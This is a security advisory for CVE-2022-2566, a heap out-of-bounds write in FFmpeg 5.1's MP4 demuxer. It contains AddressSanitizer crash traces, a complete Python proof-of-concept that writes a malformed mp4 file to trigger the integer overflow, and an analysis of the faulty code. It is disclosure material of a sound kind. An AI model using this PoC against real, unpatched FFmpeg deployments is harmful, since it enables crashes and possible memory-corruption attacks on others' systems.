---
title: 'FFmpeg: Heap Out-Of-Bounds Write in build_open_gop_key_points'
severity: High
ghsa_id: GHSA-vhxg-9wfx-7fcj
cve_id: CVE-2022-2566
weaknesses: []
products:
- ecosystem: Ubuntu
  package_name: FFmpeg
  affected_versions: 5.1 (ab77b878f1205225c6de1370fb0e998dbcc8bc69)
  patched_versions: '> 5.1 (c953baa084607dd1d84c3bfcce3cf6a87c3e6e05)'
cvss: null
credits:
- github_user_id: TheOfficialFloW
  name: Andy Nguyen
  avatar: https://avatars.githubusercontent.com/u/14246466?s=40&v=4
---

## Summary

A heap out-of-bounds write affecting FFmpeg since version 5.1 or commit ab77b878f1205225c6de1370fb0e998dbcc8bc69 was discovered in `libavformat/mov.c`.

## Severity

*High*

An attacker can cause remote code execution via a malicious mp4 file.

## Proof Of Concept

Using the script `poc.py` below, craft a malicious mp4 file and transcode it with `ffmpeg`.

With `atom_ctts()`, the following crash can be observed:

```
==1498849==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6090000009c0 at pc 0x000002947c3d bp 0x7ffdec307260 sp 0x7ffdec307258
WRITE of size 4 at 0x6090000009c0 thread T0
    #0 0x2947c3c in build_open_gop_key_points libavformat/mov.c:3976:38
    #1 0x2947c3c in mov_build_index libavformat/mov.c:4025:15
    #2 0x28f752d in mov_read_trak libavformat/mov.c:4484:5
    #3 0x28a45b7 in mov_read_default libavformat/mov.c:7788:23
    #4 0x28db8b4 in mov_read_moov libavformat/mov.c:1177:16
    #5 0x28a45b7 in mov_read_default libavformat/mov.c:7788:23
    #6 0x28a7ca5 in mov_read_header libavformat/mov.c:8357:20
    #7 0x250ba2a in avformat_open_input libavformat/demux.c:310:20
    #8 0x790da8 in open_input_file fftools/ffmpeg_opt.c:1266:11
    #9 0x78ce47 in open_files fftools/ffmpeg_opt.c:3616:15
    #10 0x78a567 in ffmpeg_parse_options fftools/ffmpeg_opt.c:3656:11
    #11 0x844608 in main fftools/ffmpeg.c:4533:11
    #12 0x7f4289f3b7fc in __libc_start_main csu/../csu/libc-start.c:332:16
    #13 0x6a6859 in _start (ffmpeg+0x6a6859)

0x6090000009c1 is located 0 bytes to the right of 1-byte region [0x6090000009c0,0x6090000009c1)
allocated by thread T0 here:
    #0 0x7241a7 in posix_memalign (ffmpeg+0x7241a7)
    #1 0x4a441c5 in av_malloc libavutil/mem.c:105:9
    #2 0x4a441c5 in av_malloc libavutil/mem.c:144:14
    #3 0x4a441c5 in av_mallocz libavutil/mem.c:266:17
    #4 0x4a441c5 in av_calloc libavutil/mem.c:277:12
    #5 0x293ac0b in build_open_gop_key_points libavformat/mov.c:3970:26
    #6 0x293ac0b in mov_build_index libavformat/mov.c:4025:15
    #7 0x28f752d in mov_read_trak libavformat/mov.c:4484:5
    #8 0x28a45b7 in mov_read_default libavformat/mov.c:7788:23
    #9 0x28db8b4 in mov_read_moov libavformat/mov.c:1177:16
    #10 0x28a45b7 in mov_read_default libavformat/mov.c:7788:23
    #11 0x28a7ca5 in mov_read_header libavformat/mov.c:8357:20
    #12 0x250ba2a in avformat_open_input libavformat/demux.c:310:20
    #13 0x790da8 in open_input_file fftools/ffmpeg_opt.c:1266:11
    #14 0x78ce47 in open_files fftools/ffmpeg_opt.c:3616:15
    #15 0x78a567 in ffmpeg_parse_options fftools/ffmpeg_opt.c:3656:11
    #16 0x844608 in main fftools/ffmpeg.c:4533:11
    #17 0x7f4289f3b7fc in __libc_start_main csu/../csu/libc-start.c:332:16
```

Without `atom_ctts()`, a crash in a later loop can be observed:

```
==1492942==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x609000000a40 at pc 0x000002948865 bp 0x7fffc97a13a0 sp 0x7fffc97a1398
WRITE of size 4 at 0x609000000a40 thread T0
    #0 0x2948864 in build_open_gop_key_points libavformat/mov.c:3998:43
    #1 0x2948864 in mov_build_index libavformat/mov.c:4025:15
    #2 0x28f752d in mov_read_trak libavformat/mov.c:4484:5
    #3 0x28a45b7 in mov_read_default libavformat/mov.c:7788:23
    #4 0x28db8b4 in mov_read_moov libavformat/mov.c:1177:16
    #5 0x28a45b7 in mov_read_default libavformat/mov.c:7788:23
    #6 0x28a7ca5 in mov_read_header libavformat/mov.c:8357:20
    #7 0x250ba2a in avformat_open_input libavformat/demux.c:310:20
    #8 0x790da8 in open_input_file fftools/ffmpeg_opt.c:1266:11
    #9 0x78ce47 in open_files fftools/ffmpeg_opt.c:3616:15
    #10 0x78a567 in ffmpeg_parse_options fftools/ffmpeg_opt.c:3656:11
    #11 0x844608 in main fftools/ffmpeg.c:4533:11
    #12 0x7f84d8d287fc in __libc_start_main csu/../csu/libc-start.c:332:16
    #13 0x6a6859 in _start (ffmpeg+0x6a6859)

0x609000000a41 is located 0 bytes to the right of 1-byte region [0x609000000a40,0x609000000a41)
allocated by thread T0 here:
    #0 0x7241a7 in posix_memalign (ffmpeg+0x7241a7)
    #1 0x4a441c5 in av_malloc libavutil/mem.c:105:9
    #2 0x4a441c5 in av_malloc libavutil/mem.c:144:14
    #3 0x4a441c5 in av_mallocz libavutil/mem.c:266:17
    #4 0x4a441c5 in av_calloc libavutil/mem.c:277:12
    #5 0x293bc80 in build_open_gop_key_points libavformat/mov.c:3990:28
    #6 0x293bc80 in mov_build_index libavformat/mov.c:4025:15
    #7 0x28f752d in mov_read_trak libavformat/mov.c:4484:5
    #8 0x28a45b7 in mov_read_default libavformat/mov.c:7788:23
    #9 0x28db8b4 in mov_read_moov libavformat/mov.c:1177:16
    #10 0x28a45b7 in mov_read_default libavformat/mov.c:7788:23
    #11 0x28a7ca5 in mov_read_header libavformat/mov.c:8357:20
    #12 0x250ba2a in avformat_open_input libavformat/demux.c:310:20
    #13 0x790da8 in open_input_file fftools/ffmpeg_opt.c:1266:11
    #14 0x78ce47 in open_files fftools/ffmpeg_opt.c:3616:15
    #15 0x78a567 in ffmpeg_parse_options fftools/ffmpeg_opt.c:3656:11
    #16 0x844608 in main fftools/ffmpeg.c:4533:11
    #17 0x7f84d8d287fc in __libc_start_main csu/../csu/libc-start.c:332:16
```

### poc.py

```py
#!/usr/bin/env python3
import struct
import sys

HEVC_NAL_CRA_NUT = 21


def atom(tag, chunk):
  data = struct.pack('>I', len(chunk) + 8)
  data += tag
  data += chunk
  return data


def atom_ftyp():
  data = b''
  data += b'mp42'  # type
  data += struct.pack('>L', 0)  # minor_ver
  return atom(b'ftyp', data)


def atom_moov(nested):
  return atom(b'moov', nested)


def atom_trak(nested):
  return atom(b'trak', nested)


def atom_hev1():
  return atom(b'hev1', b'')


def atom_stsd(nested):
  data = b''
  data += struct.pack('<I', 0)  # version & flags
  data += struct.pack('>I', 1)  # entries
  data += nested
  data += b'\0' * 70
  return atom(b'stsd', data)


def atom_sgpd():
  data = b''
  data += struct.pack('<I', 1)  # version & flags
  data += b'sync'  # grouping_type
  data += struct.pack('>I', 1)  # default_length
  data += struct.pack('>I', 1)  # entry_count
  # entry 0
  data += struct.pack('>B', HEVC_NAL_CRA_NUT)  # nal_unit_type
  return atom(b'sgpd', data)


def atom_sbgp():
  data = b''
  data += struct.pack('<I', 0)  # version & flags
  data += b'sync'  # grouping_type
  data += struct.pack('>I', 2)  # entries
  # entry 0
  data += struct.pack('>I', 1)  # sample_count
  data += struct.pack('>I', 1)  # group_description_index
  # entry 1
  data += struct.pack('>I', 0xffffffff)  # sample_count
  data += struct.pack('>I', 1)  # group_description_index
  return atom(b'sbgp', data)


def atom_ctts():
  data = b''
  data += struct.pack('<I', 0)  # version & flags
  data += struct.pack('>I', 4)  # entries
  # entry 0
  data += struct.pack('>I', 0x40000000)  # count
  data += struct.pack('>I', 0x00414141)  # duration
  # entry 1
  data += struct.pack('>I', 0x40000000)  # count
  data += struct.pack('>I', 0x00414141)  # duration
  # entry 2
  data += struct.pack('>I', 0x40000000)  # count
  data += struct.pack('>I', 0x00414141)  # duration
  # entry 3
  data += struct.pack('>I', 0x40000000)  # count
  data += struct.pack('>I', 0x00414141)  # duration
  return atom(b'ctts', data)


def main():
  if len(sys.argv) != 2:
    print('Usage: poc.py out.mp4')
    return -1

  data = atom_ftyp() + atom_moov(
      atom_trak(
          atom_stsd(atom_hev1()) + atom_sgpd() + atom_sbgp()
          # + atom_ctts()
      ))

  open(sys.argv[1], 'wb').write(data)


if __name__ == '__main__':
  main()
```

## Analysis

The size calculation in `build_open_gop_key_points()` goes through all entries in the loop and adds `sc->ctts_data[i].count` to `sc->sample_offsets_count`. This can lead to an integer overflow resulting in a small allocation with `av_calloc()`:

```c
    sc->sample_offsets_count = 0;
    for (uint32_t i = 0; i < sc->ctts_count; i++)
        sc->sample_offsets_count += sc->ctts_data[i].count;
    av_freep(&sc->sample_offsets);
    sc->sample_offsets = av_calloc(sc->sample_offsets_count, sizeof(*sc->sample_offsets));
```

As a consequence, the array `sc->sample_offsets` can be written to out-of-bounds:

```c
    for (uint32_t i = 0; i < sc->ctts_count; i++)
        for (int j = 0; j < sc->ctts_data[i].count; j++)
             sc->sample_offsets[k++] = sc->ctts_data[i].duration;
```

Similarly, in the same function, there is an integer overflow for `sc->open_key_samples_count`:

```c
    sc->open_key_samples_count = 0;
    for (uint32_t i = 0; i < sc->sync_group_count; i++)
        if (sc->sync_group[i].index == cra_index)
            sc->open_key_samples_count += sc->sync_group[i].count;
    av_freep(&sc->open_key_samples);
    sc->open_key_samples = av_calloc(sc->open_key_samples_count, sizeof(*sc->open_key_samples));
```

An array out-of-bounds write can occur at:

```c
    for (uint32_t i = 0; i < sc->sync_group_count; i++) {
        const MOVSbgp *sg = &sc->sync_group[i];
        if (sg->index == cra_index)
            for (uint32_t j = 0; j < sg->count; j++)
                sc->open_key_samples[k++] = sample_id;
        sample_id += sg->count;
    }
```

## Timeline
**Date reported**:  07/27/2022
**Date fixed**: 08/26/2022
**Date disclosed**: 09/28/2022